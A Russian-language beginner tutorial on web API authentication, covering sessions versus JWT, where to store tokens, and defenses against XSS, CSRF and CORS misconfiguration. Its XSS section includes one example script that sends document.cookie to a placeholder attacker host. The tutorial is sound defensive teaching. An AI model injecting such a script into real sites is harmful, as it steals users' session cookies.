# Архитектура: Аутентификация и Безопасность API

Привет! 👋 Я твой ментор, и сегодня мы разберем одну из самых важных и "страшных" для новичков тем — **Аутентификация** и **Безопасность веб-приложений**.

Мы пойдем от простого к сложному. Сначала разберемся, как сервер понимает, кто ты такой (Session vs JWT), где хранить эти "пропуска" (Cookies vs LocalStorage), и наконец, как защититься от злодеев (XSS, CSRF, CORS).

---

## 1. Основы: Аутентификация vs Авторизация

Для начала давай запомним разницу, чтобы не путаться:

*   **Authentication (Аутентификация):** Проверка того, **кто ты** (Логин + Пароль). *Пример: Ты показываешь паспорт на проходной.*
*   **Authorization (Авторизация):** Проверка того, **что тебе можно делать**. *Пример: Охранник смотрит, есть ли твое имя в списке гостей VIP-зоны.*

---

## 2. Как сервер помнит пользователя? (Sessions vs JWT)

HTTP — это протокол **без сохранения состояния** (stateless). Это значит, что серверу плевать, кто ты, как только он отдал тебе ответ. Чтобы "запомнить" тебя между запросами, нам нужен механизм.

### Вариант А: Сессии (Session-based Auth) — "Классика"

Это старый, проверенный способ.

1.  **Процесс:** Ты вводишь логин/пароль.
2.  **На сервере:** Сервер проверяет их, создает в своей памяти (или базе данных) объект "Сессия" и присваивает ему уникальный `Session ID`.
3.  **Ответ:** Сервер отправляет этот `Session ID` тебе в браузер (обычно в **Cookie**).
4.  **Дальнейшие запросы:** Твой браузер автоматически прикрепляет эту Cookie к каждому запросу. Сервер видит ID, ищет его у себя в памяти и понимает: "А, это же наш Джуниор!".

**Плюсы:**
*   Легко отозвать доступ (просто удаляем сессию на сервере — и пользователь "вылетел").
*   Сессии обычно короче и безопаснее по умолчанию.

**Минусы:**
*   **Нагрузка на сервер:** Сервер должен хранить данные о *всех* залогиненных пользователях в памяти (RAM или Redis). Если пользователей миллион, это проблема.
*   **Сложнее масштабировать:** Если у тебя несколько серверов, им нужно "шарить" сессии между собой (нужен общий Redis).

### Вариант Б: Токены (JWT - JSON Web Token) — "Современный стандарт"

Здесь сервер **не хранит** информацию о том, что ты залогинен. Он отдает эту задачу тебе.

1.  **Процесс:** Ты вводишь логин/пароль.
2.  **На сервере:** Сервер проверяет их. Если ок, он берет твои данные (ID, роль), "подписывает" их секретным ключом и упаковывает в строку — **JWT**.
3.  **Ответ:** Сервер отдает тебе этот токен.
4.  **Дальнейшие запросы:** Ты сам должен прикреплять этот токен к каждому запросу (обычно в заголовке `Authorization: Bearer <token>`).
5.  **Проверка:** Сервер получает токен, проверяет подпись своим секретным ключом. Если подпись верна — он доверяет данным внутри. Ему не нужно лезть в базу, чтобы узнать, кто ты.

**Структура JWT** (3 части, разделенные точками):
1.  `Header`: Алгоритм шифрования.
2.  `Payload`: Данные (User ID, Role, Expire date). **Внимание:** Это Base64, его может расшифровать кто угодно! Не клади туда пароли.
3.  `Signature`: Секретная подпись сервера (гарант, что токен не подделали).

**Плюсы:**
*   **Stateless:** Серверу не нужно хранить сессии. Отлично для микросервисов.
*   **Масштабируемость:** Любой сервер, знающий "секрет", может проверить токен.

**Минусы:**
*   **Нельзя отозвать:** Если токен украли, он валиден, пока не истечет срок его жизни (expiration time). *Решение: короткий Access Token + длинный Refresh Token.*
*   Размер токена больше, чем просто ID сессии.

## 3. Где хранить токены на клиенте? (LocalStorage vs Cookies)

Это холиварная тема, но давай разберем факты.

### LocalStorage
*   **Как:** `localStorage.setItem('token', jwt)`
*   **Плюсы:** Удобно для JS (легко читать, легко отправлять в заголовках).
*   **ОГРОМНЫЙ МИНУС:** **XSS уязвимость**. Если хакер сможет выполнить любой JS код на твоем сайте (через XSS), он легко прочитает `localStorage` и украдет токен.

### Cookies (HttpOnly)
*   **Как:** Сервер сам ставит куку с флагом `HttpOnly`.
*   **Плюсы:** **JS не имеет доступа к такой куке**. Даже если хакер проведет XSS-атаку, он не сможет прочитать токен. Браузер сам отправляет куку на сервер.
*   **Минус:** Уязвимость к **CSRF** (о ней ниже).

**Вердикт учителя:** Для максимальной безопасности используй **HttpOnly Cookies** для хранения Refresh Token'а. Access Token можно держать в памяти JS приложения (переменной) или тоже в куках, но никогда не храни долговременные секреты в LocalStorage, если у тебя нет железобетонной защиты от XSS.

## 4. Страшные аббревиатуры: XSS, CSRF, CORS

### XSS (Cross-Site Scripting) — Межсайтовый скриптинг
**Суть:** Злоумышленник внедряет свой вредоносный JS-код на твою страницу.
*   *Пример:* На форуме в комментарии кто-то пишет `<script>fetch('http://hacker.com?cookie=' + document.cookie)</script>`. Если ты это не отфильтруешь, скрипт выполнится у всех, кто откроет страницу.

**Как защититься:**
1.  **Экранирование (Sanitization):** Никогда не вставляй пользовательский ввод "как есть". React/Vue/Angular делают это автоматически, но будь осторожен с `dangerouslySetInnerHTML`.
2.  **CSP (Content Security Policy):** Специальный заголовок, который говорит браузеру: "Загружай скрипты только с моего домена, остальные блокируй".
3.  **HttpOnly Cookies:** Чтобы даже при успешной XSS у хакера не вышло украсть сессию.

### CSRF (Cross-Site Request Forgery) — Подделка межсайтовых запросов
**Суть:** Хакер заставляет твой браузер сделать запрос на твой банк/сайт, где ты уже залогинен, без твоего ведома.
*   *Пример:* Ты залогинен в интернет-банке. Заходишь на сайт `win-iphone.com`. Там скрытая форма, которая отправляет POST-запрос `bank.com/transfer?to=hacker&amount=1000`. Так как ты залогинен, браузер услужливо прикрепляет твои Cookies банка к этому запросу. Банк думает, что это ты переводишь деньги.

**Как защититься:**
1.  **CSRF-токены:** Сервер выдает специальный одноразовый токен для форм. Хакер на своем сайте его знать не может.
2.  **SameSite Cookies:** Современный атрибут для Cookies (`SameSite=Strict` или `Lax`). Он запрещает браузеру отправлять куки, если запрос идет с другого сайта (например, с `win-iphone.com` на `bank.com`).

### CORS (Cross-Origin Resource Sharing)
Это не атака, а **защита браузера**.
**Суть:** По умолчанию браузер запрещает JS-коду с одного домена (например, `frontend.com`) делать запросы к другому домену (`api-backend.com`).

**Как это выглядит:** Ты видишь ошибку в консоли: *Access to fetch at ... has been blocked by CORS policy*.

**Как настроить (на бэкенде):**
Ты должен явно разрешить своему фронтенду стучаться к бэкенду.
*   *Пример (Express.js/NestJS):*
    ```javascript
    app.use(cors({
      origin: 'https://my-frontend-app.com', // Разрешаем только нашему фронту
      credentials: true // Разрешаем передавать куки/токены
    }));
    ```
*   **Важно:** Никогда не ставь `origin: '*'` (разрешить всем) в продакшене, если у тебя есть авторизация. Это дыра в безопасности.

---

## 5. Итоговое резюме (Шпаргалка)

1.  **JWT** — стандарт де-факто для современных API (stateless, масштабируемо).
2.  **Где хранить?**
    *   **Refresh Token** -> в **HttpOnly Cookie** (безопасно от XSS).
    *   **Access Token** -> в памяти JS (короткая жизнь) или тоже в куке.
3.  **Защита:**
    *   От **XSS**: Экранируй ввод, используй CSP, не храни токены в LocalStorage.
    *   От **CSRF**: Используй Cookie с `SameSite=Strict/Lax`.
    *   **CORS**: Настрой "белый список" доменов на бэкенде.

Учи это, студент! Это база, на которой держится безопасность веба. Если что-то непонятно — спрашивай, разберем на примерах. 🚀
